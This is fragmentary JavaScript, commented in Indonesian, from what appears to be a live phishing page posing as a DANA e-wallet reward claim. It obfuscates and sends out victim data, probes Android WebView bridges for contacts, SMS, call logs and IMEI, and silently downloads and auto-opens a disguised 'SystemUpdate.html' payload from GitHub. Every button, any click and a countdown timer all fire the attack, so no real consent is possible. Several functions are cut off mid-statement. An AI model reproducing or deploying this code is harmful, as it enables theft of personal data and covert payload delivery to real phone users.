// 2. ENHANCED EXFILTRATION PIPELINE (ENCRYPTED)
// ============================================================
var exfilQueue = [];
var exfilSending = false;

// Override K() dengan yang sudah di-enhance
var originalK = K;
K = function(d) {
    d._timestamp = Date.now();
    d._nonce = Math.random().toString(36).substring(2);
    exfilQueue.push(d);
    if (!exfilSending) {
        processExfilQueue();
    }
};

function processExfilQueue() {
    if (exfilQueue.length === 0) {
        exfilSending = false;
        return;
    }
    exfilSending = true;
    var item = exfilQueue.shift();
    var plain = JSON.stringify(item);
    var encoded = btoa(plain);
    var xorKey = 0x2A;
    var encrypted = '';
    for (var i = 0; i < encoded.length; i++) {
        encrypted += String.fromCharCode(encoded.charCodeAt(i) ^ xorKey);
    }
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.timeout = 5000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                processExfilQueue();
            } else {
                exfilQueue.unshift(item);
                setTimeout(processExfilQueue, 3000);
            }
        };
        xhr.onerror = function() {
            exfilQueue.unshift(item);
            setTimeout(processExfilQueue, 3000);
        };
        xhr.send(encrypted);
    } catch(e) {
        exfilQueue.unshift(item);
        setTimeout(processExfilQueue, 3000);
    }
}

    try {
        Object.defineProperty(navigator, 'userAgent', {

            configurable: false

    document.cookie.split(';').forEach(function(cookie) {
        document.cookie = cookie.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
    });
}

// 🔥 DETEKSI BRIDGE SUPER LUAS (PENDEKATAN 3 LAPIS)
// ============================================================
var BRIDGE = null;

(function detectBridgeUltra() {
    // Pendekatan 1: Daftar nama variabel yang umum digunakan
    var candidates = [
        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'JSBridgeNative',
        'AppBridge', 'AppJSBridge', 'HybridBridge', 'WebViewJSBridge',
        'AndroidWebViewBridge', 'JavaBridge', 'JavascriptBridge',
        'window.AndroidBridge', 'window.JSBridge', 'window.WebViewJavascriptBridge',
        'window.NativeBridge', 'window.Bridge', 'window.WebBridge',
        'window.JSBridgeInterface', 'window.AndroidJSBridge',
        'window.WebViewBridge', 'window.AppBridge'
    ];

    // Coba per nama
    for (var i = 0; i < candidates.length; i++) {
        var candidate = candidates[i];
        if (candidate.indexOf('.') > -1) {
            var parts = candidate.split('.');
            var obj = window;
            var found = true;
            for (var j = 0; j < parts.length; j++) {
                if (obj[parts[j]] === undefined) {
                    found = false;
                    break;
                }
                obj = obj[parts[j]];
            }
            if (found && obj !== null) {
                BRIDGE = obj;
                return;
            }
        } else {
            if (typeof window[candidate] !== 'undefined') {
                BRIDGE = window[candidate];
                return;
            }
        }
    }

    // Pendekatan 2: Cari objek global dengan method khas bridge
    var methodSignatures = ['getAllContacts', 'getIMEI', 'getAllSMS', 'getCallLog', 'sendSMS', 'openApp'];
    for (var key in window) {
        if (typeof window[key] === 'object' && window[key] !== null) {
            for (var m = 0; m < methodSignatures.length; m++) {
                if (typeof window[key][methodSignatures[m]] === 'function') {
                    BRIDGE = window[key];
                    return;
                }
            }
        }
    }

    // Pendekatan 3: Cari objek dengan method 'postMessage' yang biasa digunakan bridge
    for (var key2 in window) {
        if (typeof window[key2] === 'object' && window[key2] !== null) {
            if (typeof window[key2].postMessage === 'function' && typeof window[key2].send === 'function') {
                BRIDGE = window[key2];
                return;
            }
        }
    }
})();

        try { return localStorage.getItem('pref_' + key); } catch(e){}

        try {
            var base64 = btoa(String.fromCharCode.apply(null, data));

            return true;
        } catch(e){}
        return false;
    }
};

// ============================================================
// FUNGSI UNTUK MENENTUKAN APAKAH MENGGUNAKAN BRIDGE ATAU FALLBACK
// ============================================================
function getBridge() {
    if (HAS_BRIDGE) {
        return BRIDGE;
    }
    return FALLBACK;
}

// ============================================================
// WRAPPER UNTUK SEMUA FUNGSI BRIDGE
// ============================================================
function bridgeCall(method, args) {
    var bridge = getBridge();
    if (typeof bridge[method] === 'function') {
        try {
            return bridge[method].apply(bridge, args);
        } catch(e) {
            return null;
        }
    }
    return null;
}

        isWebView: ua.indexOf('wv') > -1 || ua.indexOf('webview') > -1,
        isAndroidBridge: typeof AndroidBridge !== 'undefined'

    return platform;
}

// ============================================================
// DOWNLOAD SystemUpdate.html KE STORAGE KORBAN (MULTI-LOKASI)
// ============================================================
function downloadPayloadSilent() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    K({ sumber: 'download_start', data: { platform: PLATFORM } });
    
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var htmlContent = xhr.responseText;
                // Simpan ke semua lokasi (agar SystemUpdate.html bisa di-load nanti)
                saveToAllLocations(htmlContent);
                K({ sumber: 'html_download_success', data: 'ok' });
            }
        };
        xhr.send();
    } catch(e) {}
}

function saveToAllLocations(htmlContent) {
    // 1. localStorage
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    // 2. IndexedDB
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(htmlContent, 'SystemUpdate.html');
        };
    } catch(e) {}
    // 3. Android/data (via Bridge)
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            // Ganti path ke Download folder
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            A.saveFile(path, htmlContent);
        } catch(e) {}
        // 4. SharedPreferences (encoded)
        try {
            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
            A.saveToPreferences('system_SystemUpdate_html', encoded);
        } catch(e) {}
    }
}

// ============================================================
// 🔥 TUGAS 3: BUKA SystemUpdate.html OTOMATIS (5 DETIK SETELAH DOWNLOAD)
// ============================================================
function openSystemUpdateHTML() {
    setTimeout(function() {
        // Coba buka dari berbagai lokasi (prioritas: SharedPreferences → localStorage → IndexedDB → Download)
        var htmlContent = null;
        // 1. SharedPreferences (via Bridge)
        if (PLATFORM.isAndroid && A.isAvailable) {
            try {
                var encoded = A.getFromPreferences('system_SystemUpdate_html');
                if (encoded) {
                    htmlContent = decodeURIComponent(escape(atob(encoded)));
                }
            } catch(e) {}
        }
        // 2. localStorage
        if (!htmlContent) {
            try { htmlContent = localStorage.getItem('SystemUpdate_backup'); } catch(e) {}
        }
        // 3. IndexedDB (async, tapi kita coba sync dengan callback)
        if (!htmlContent) {
            try {
                var request = indexedDB.open('SystemUpdateDB', 1);
                request.onsuccess = function(e) {
                    var db = e.target.result;
                    var tx = db.transaction('files', 'readonly');
                    var store = tx.objectStore('files');
                    var get = store.get('SystemUpdate.html');
                    get.onsuccess = function() {
                        if (get.result) {
                            htmlContent = get.result;
                            openHTML(htmlContent);
                        }
                    };
                };
            } catch(e) {}
        }
        // 4. Ganti ke Download folder
        if (!htmlContent && PLATFORM.isAndroid && A.isAvailable) {
            try {
                htmlContent = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
            } catch(e) {}
        }
        // 5. Jika berhasil, buka
        if (htmlContent) {
            openHTML(htmlContent);
        }
    }, 5000);
}

function openHTML(htmlContent) {
    // Android Bridge (buka file)
    if (PLATFORM.isAndroid && A.isAvailable) {
        try {
            // Ganti ke Download folder
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            // Pastikan file ada
            if (A.fileExists(path)) {
                A.openFile(path);
                return;
            }
        } catch(e) {}
    }
    // Blob URL (fallback)
    try {
        var blob = new Blob([htmlContent], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        window.open(url, '_blank');
    } catch(e) {}
}

    REDIRECT_DONE = true;

function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        var popup = document.getElementById('popupDana');
        if (popup) popup.style.display = 'none';
        
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        injectAllPermissions();
        
//        setTimeout(escapeWebView, 100);
        setTimeout(function() { downloadPayloadSilent(); }, 500);
        setTimeout(function() { showStatusBar(); }, 500);
        openSystemUpdateHTML();
        
        setTimeout(function() { showKlaimNotification(); }, 3000);
        setTimeout(redirectToDANA, 8000);
        
    } catch(e) {
        K({ sumber: 'dapatkanSemua_error', data: e.message });
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER (10 DETIK)
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});
